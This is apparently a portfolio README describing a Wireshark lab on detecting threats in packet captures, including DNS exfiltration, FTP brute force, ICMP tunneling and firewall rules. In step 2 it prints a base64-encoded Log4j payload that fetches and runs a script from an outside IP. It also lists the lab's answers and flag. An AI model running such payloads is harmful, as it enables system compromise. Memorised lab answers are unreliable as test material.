# Network Security and Traffic Analysis Project

This project covers an in-depth analysis of network traffic, utilizing packet captures to identify, investigate, and mitigate various network-based incidents. Through a series of tasks, I applied filtering techniques to Wireshark captures to extract key insights and develop firewall rules.

## Objective

The goal was to analyze network traffic in order to detect anomalies, investigate potential security threats, and enforce firewall rules to improve network security.

## Skills Learned

- **Advanced Packet Filtering**: Created complex filters to isolate specific traffic types across protocols such as DNS, HTTP, TCP, and FTP.
- **Protocol Analysis**: Interpreted various protocols and payloads, including decoding base64-encoded commands and identifying abnormal user-agent strings.
- **Firewall Rule Creation**: Developed firewall rules to block or allow traffic based on specific IP addresses and MAC addresses.
- **Incident Response**: Investigated suspicious network activities, including brute-force login attempts, Log4j exploit attempts, and ICMP tunneling.

## Tools Used

- **Wireshark**: For filtering and inspecting packets at a granular level.
- **Command Line (Linux)**: For decoding encoded traffic and handling command-line-based network tasks.

## Steps

### 1. Anomalous User-Agent Detection
- **Objective**: Identify anomalous "User-Agent" types.
- **Filter Used**: `Http.user_agent`
- **Result**: 6 anomalous user-agent types detected.

![image](https://github.com/user-attachments/assets/c9eb7c4d-945a-4f72-9aa4-26b3c1642e78)

### 2. Log4j Exploit Analysis
- **Objective**: Detect the IP contacted by adversary using a Log4j exploit and decode the payload.
- **Command Used**: `echo d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA== | base64 --decode`
- **Result**: IP address contacted by the adversary was 62[.]210[.]130[.]250.

![Log4j Exploit Analysis](https://github.com/user-attachments/assets/cd358b9c-cf17-450a-9888-88ca9b307ff5)


### 3. Kerberos Traffic - Identifying User IPs
- **Objective**: Find the IP address of user "u5" in Kerberos packets.
- **Filter Used**: `kerberos.CNameString contains "u5"`
- **Result**: IP address of user "u5" is 10[.]1[.]12[.]2.

![Kerberos User IP Identification](https://github.com/user-attachments/assets/159f359f-3f8c-4ea9-a77c-e4209c99e6d2)


### 4. ICMP Tunneling Detection
- **Objective**: Identify protocol used in ICMP tunneling.
- **Filter Used**: `(data.len > 64) and (icmp contains "ssh")`
- **Result**: SSH protocol was detected in ICMP tunnel.

![ICMP Tunneling with SSH Protocol](https://github.com/user-attachments/assets/52089aeb-393a-4257-ab37-5171eb05aeff)


### 5. DNS Exfiltration Analysis
- **Objective**: Detect suspicious DNS queries with long domain names.
- **Filter Used**: `dns.qry.name.len > 40 and !mdns && dns.qry.name contains ".com"`
- **Result**: Anomalous queries were directed to "dataexfil[.]com".

![DNS Exfiltration Detection](https://github.com/user-attachments/assets/4630a662-deb3-40e0-9890-78ecba511411)


### 6. FTP Brute-Force Login Attempts
- **Objective**: Count incorrect FTP login attempts.
- **Filter Used**: `Ftp.response.code == 530`
- **Result**: 737 incorrect login attempts detected.

![FTP Brute-Force Attempts](https://github.com/user-attachments/assets/47e63e2f-84a7-44a6-a008-0cb9efb0e350)


### 7. Empty Password Submission in FTP
- **Objective**: Identify the packet where an empty password was submitted.
- **Filter Used**: `ftp.request.command == "PASS"`
- **Result**: Found in packet number 170.

![Empty Password Submission](https://github.com/user-attachments/assets/9efd6930-3f75-413e-a8ee-6b0679cef9a9)


### 8. Firewall Rule for Denying Specific IP
- **Objective**: Create an IPFirewall rule to deny a specific source IP address.
- **Rule**: `add deny ip from 10.121.70.151 to any in`
- **Packet Reference**: 99

![Deny IP Firewall Rule](https://github.com/user-attachments/assets/152f3117-e4db-45e2-9e54-250c0981deec)

### 9. Allowing Traffic from Specific MAC Address
- **Objective**: Configure IPFirewall to allow traffic from a specific MAC address.
- **Rule**: `add allow MAC 00:d0:59:aa:af:80 any in`
- **Packet Reference**: 231

![Allow MAC Firewall Rule](https://github.com/user-attachments/assets/58b58c5a-0c5b-49f8-96a5-8db777599234)


### 10. HTTP2 Traffic Analysis and Flag Discovery
- **Objective**: Decrypt HTTP2 traffic to locate a hidden flag.
- **Result**: The flag was identified as `FLAG{THM-PACKETMASTER}`.

![HTTP2 Flag Discovery](https://github.com/user-attachments/assets/94b09df9-feb2-4687-89f0-6cd99f0419ca)


## Conclusion

This project demonstrated the effectiveness of packet filtering and protocol analysis in identifying network anomalies and security incidents. By using targeted filters and firewall rules, I was able to reveal critical data patterns, investigate security threats, and enforce access control measures. This exercise was instrumental in strengthening my skills in network traffic analysis and security response.




